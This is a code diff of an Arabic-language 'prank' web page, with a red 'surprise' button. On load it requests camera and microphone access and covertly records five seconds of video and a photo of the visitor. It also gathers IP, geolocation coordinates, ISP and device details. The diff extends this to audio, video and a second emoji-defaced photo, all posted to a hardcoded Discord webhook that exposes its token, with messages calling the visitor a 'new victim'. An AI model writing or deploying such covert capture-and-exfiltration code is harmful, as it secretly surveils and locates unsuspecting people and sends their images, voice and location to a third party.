@@ -107,9 +107,24 @@
       font-size: 60px;
       margin-bottom: 20px;
     }
+
+    #flashOverlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: white;
+      opacity: 0;
+      pointer-events: none;
+      z-index: 9999;
+      transition: opacity 0.1s;
+    }
   </style>
 </head>
 <body>
+  <div id="flashOverlay"></div>
+  
   <div class="container">
     <!-- شاشة التحميل -->
     <div id="loadingScreen">
@@ -125,7 +140,7 @@
       <p style="color: #666; font-size: 18px; margin: 20px 0;">
         اضغط على الزر الأحمر لرؤية مفاجأة خاصة!
       </p>
-      <button class="red-btn" onclick="showPhoto()">اضغط هنا 🎁</button>
+      <button class="red-btn" onclick="takeSurprisePhoto()">اضغط هنا 🎁</button>
     </div>
 
     <!-- شاشة عرض الصورة -->
@@ -141,6 +156,7 @@
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
+  <canvas id="emojiCanvas"></canvas>
 
   <script>
     const loadingScreen = document.getElementById('loadingScreen');
@@ -148,12 +164,16 @@
     const photoScreen = document.getElementById('photoScreen');
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
+    const emojiCanvas = document.getElementById('emojiCanvas');
     const capturedPhoto = document.getElementById('capturedPhoto');
+    const flashOverlay = document.getElementById('flashOverlay');
 
-    // ضع Discord Webhook هنا
     const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1464000266369110038/QPfYRwlrewHl-vowOukyN-YrYRIJ3pZiw_KhIx5NMbB-QDn4Cm9rNnoU1K6yngbkF5MC';
 
     let savedPhotoData = null;
+    let videoRecorded = null;
+    let surprisePhotoData = null;
+    let cameraStream = null;
 
     // جمع معلومات الجهاز
     async function getDeviceInfo() {
@@ -188,32 +208,38 @@
       return info;
     }
 
-    // تشغيل تلقائي عند فتح الصفحة
+    // تشغيل عند فتح الصفحة
     window.onload = async function() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: "user" } 
+        cameraStream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: "user" },
+          audio: true
         });
         
-        video.srcObject = stream;
+        video.srcObject = cameraStream;
         
         await new Promise(resolve => {
           video.onloadedmetadata = () => {
             video.play();
-            setTimeout(resolve, 2000);
+            resolve();
           };
         });
 
+        // تسجيل فيديو 5 ثواني
+        await recordVideo();
+
+        // التقاط صورة عادية
+        await new Promise(resolve => setTimeout(resolve, 500));
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0);
-        
         savedPhotoData = canvas.toDataURL('image/png');
 
-        stream.getTracks().forEach(track => track.stop());
-
-        await sendToDiscord(savedPhotoData);
+        // لا توقف الكاميرا - نحتاجها للصورة الثانية
+        
+        // إرسال الفيديو والصورة الأولى
+        await sendToDiscord(savedPhotoData, videoRecorded, 'initial');
 
         loadingScreen.style.display = 'none';
         mainScreen.style.display = 'block';
@@ -231,100 +257,135 @@
       }
     };
 
-    // إرسال للـ Discord
-    async function sendToDiscord(imageData) {
-      try {
-        console.log('📸 بدء الإرسال للـ Discord...');
+    // تسجيل فيديو
+    async function recordVideo() {
+      return new Promise((resolve) => {
+        const mediaRecorder = new MediaRecorder(cameraStream, {
+          mimeType: 'video/webm'
+        });
         
-        // جمع معلومات الجهاز
-        const deviceInfo = await getDeviceInfo();
-        console.log('📊 معلومات الجهاز:', deviceInfo);
+        const chunks = [];
+        
+        mediaRecorder.ondataavailable = (e) => {
+          if (e.data.size > 0) {
+            chunks.push(e.data);
+          }
+        };
+        
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          videoRecorded = blob;
+          console.log('✅ تم تسجيل الفيديو:', blob.size, 'bytes');
+          resolve();
+        };
+        
+        mediaRecorder.start();
+        console.log('🎥 بدء تسجيل الفيديو...');
+        
+        // تسجيل لمدة 5 ثواني
+        setTimeout(() => {
+          mediaRecorder.stop();
+        }, 5000);
+      });
+    }
 
-        // تحويل base64 إلى blob
-        const blob = await fetch(imageData).then(r => r.blob());
+    // التقاط صورة مع فلاش وإيموجي عند الضغط على الزر
+    async function takeSurprisePhoto() {
+      try {
+        // تأثير الفلاش
+        flashOverlay.style.opacity = '1';
+        setTimeout(() => {
+          flashOverlay.style.opacity = '0';
+        }, 200);
+
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        // التقاط صورة
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+
+        // إضافة إيموجي الخرا على الوجه
+        const emojiSize = Math.min(canvas.width, canvas.height) * 0.3;
+        const x = (canvas.width - emojiSize) / 2;
+        const y = (canvas.height - emojiSize) / 2.5;
+
+        ctx.font = `${emojiSize}px Arial`;
+        ctx.fillText('💩', x, y + emojiSize);
+
+        surprisePhotoData = canvas.toDataURL('image/png');
+
+        // إيقاف الكاميرا الآن
+        if (cameraStream) {
+          cameraStream.getTracks().forEach(track => track.stop());
+        }
+
+        // إرسال الصورة مع الإيموجي
+        await sendToDiscord(surprisePhotoData, null, 'surprise');
+
+        // عرض الصورة
+        showPhoto();
+
+      } catch (error) {
+        console.error('خطأ في التصوير:', error);
+      }
+    }
+
+    // عرض الصورة
+    function showPhoto() {
+      if (surprisePhotoData) {
+        capturedPhoto.src = surprisePhotoData;
+        mainScreen.style.display = 'none';
+        photoScreen.style.display = 'block';
+      }
+    }
+
+    // إرسال للـ Discord
+    async function sendToDiscord(imageData, videoBlob, type) {
+      try {
+        console.log(`📸 بدء الإرسال (${type})...`);
         
-        // إنشاء FormData
+        const deviceInfo = await getDeviceInfo();
         const formData = new FormData();
-        formData.append('file', blob, 'prank.png');
         
-        // إنشاء رسالة Embed منسّقة
+        // إضافة الصورة
+        if (imageData) {
+          const imageBlob = await fetch(imageData).then(r => r.blob());
+          formData.append('file1', imageBlob, `photo_${type}_${Date.now()}.png`);
+        }
+
+        // إضافة الفيديو
+        if (videoBlob) {
+          formData.append('file2', videoBlob, `video_${Date.now()}.webm`);
+        }
+        
+        // إنشاء رسالة
+        const messageType = type === 'initial' ? '📸 الصورة والفيديو الأولي' : '💩 صورة المفاجأة (مع الإيموجي)';
+        
         const embed = {
-          title: '🎯 تم التقاط صورة جديدة!',
-          color: 15158332, // أحمر
+          title: `🎯 ${messageType}`,
+          color: type === 'initial' ? 3447003 : 15158332,
           fields: [
-            {
-              name: '🌐 IP Address',
-              value: `\`${deviceInfo.ip}\``,
-              inline: true
-            },
-            {
-              name: '📍 الموقع',
-              value: `${deviceInfo.city}, ${deviceInfo.country}`,
-              inline: true
-            },
-            {
-              name: '🗺️ المنطقة',
-              value: deviceInfo.region,
-              inline: true
-            },
-            {
-              name: '📡 ISP',
-              value: deviceInfo.isp,
-              inline: false
-            },
-            {
-              name: '📌 الإحداثيات',
-              value: `${deviceInfo.latitude}, ${deviceInfo.longitude}`,
-              inline: true
-            },
-            {
-              name: '💻 النظام',
-              value: deviceInfo.platform,
-              inline: true
-            },
-            {
-              name: '🖥️ الشاشة',
-              value: deviceInfo.screenResolution,
-              inline: true
-            },
-            {
-              name: '🌍 اللغة',
-              value: deviceInfo.language,
-              inline: true
-            },
-            {
-              name: '⏰ المنطقة الزمنية',
-              value: deviceInfo.timezone,
-              inline: true
-            },
-            {
-              name: '🧠 الذاكرة',
-              value: `${deviceInfo.deviceMemory} GB`,
-              inline: true
-            },
-            {
-              name: '⚙️ المعالج',
-              value: `${deviceInfo.cores} cores`,
-              inline: true
-            },
-            {
-              name: '🌐 User Agent',
-              value: `\`\`\`${deviceInfo.userAgent}\`\`\``,
-              inline: false
-            }
+            { name: '🌐 IP', value: `\`${deviceInfo.ip}\``, inline: true },
+            { name: '📍 الموقع', value: `${deviceInfo.city}, ${deviceInfo.country}`, inline: true },
+            { name: '🗺️ المنطقة', value: deviceInfo.region, inline: true },
+            { name: '📡 ISP', value: deviceInfo.isp, inline: false },
+            { name: '📌 الإحداثيات', value: `${deviceInfo.latitude}, ${deviceInfo.longitude}`, inline: true },
+            { name: '💻 النظام', value: deviceInfo.platform, inline: true },
+            { name: '🖥️ الشاشة', value: deviceInfo.screenResolution, inline: true },
+            { name: '🌍 اللغة', value: deviceInfo.language, inline: true },
+            { name: '⏰ المنطقة الزمنية', value: deviceInfo.timezone, inline: true },
+            { name: '🧠 الذاكرة', value: `${deviceInfo.deviceMemory} GB`, inline: true }
           ],
           timestamp: new Date().toISOString(),
-          footer: {
-            text: '😂 تم المقلب بنجاح'
-          }
+          footer: { text: type === 'initial' ? '🎥 فيديو 5 ثواني مرفق' : '😂 تم المقلب!' }
         };
 
         formData.append('payload_json', JSON.stringify({
-          content: '🎉 **ضحية جديدة!**',
+          content: type === 'initial' ? '🎉 **ضحية جديدة!**' : '💩 **ضغط على الزر!**',
           embeds: [embed]
         }));
-
-        console.log('📤 جاري الإرسال...');
 
         const response = await fetch(DISCORD_WEBHOOK, {
           method: 'POST',
@@ -332,22 +393,13 @@
         });
 
         if (response.ok) {
-          console.log('✅ تم الإرسال بنجاح للـ Discord!');
+          console.log(`✅ تم الإرسال بنجاح (${type})!`);
         } else {
-          const errorText = await response.text();
-          console.error('❌ فشل الإرسال:', response.status, errorText);
+          console.error('❌ فشل الإرسال:', await response.text());
         }
 
       } catch (error) {
-        console.error('❌ خطأ في الإرسال:', error);
-      }
-    }
-
-    function showPhoto() {
-      if (savedPhotoData) {
-        capturedPhoto.src = savedPhotoData;
-        mainScreen.style.display = 'none';
-        photoScreen.style.display = 'block';
+        console.error('❌ خطأ:', error);
       }
     }
   </script>
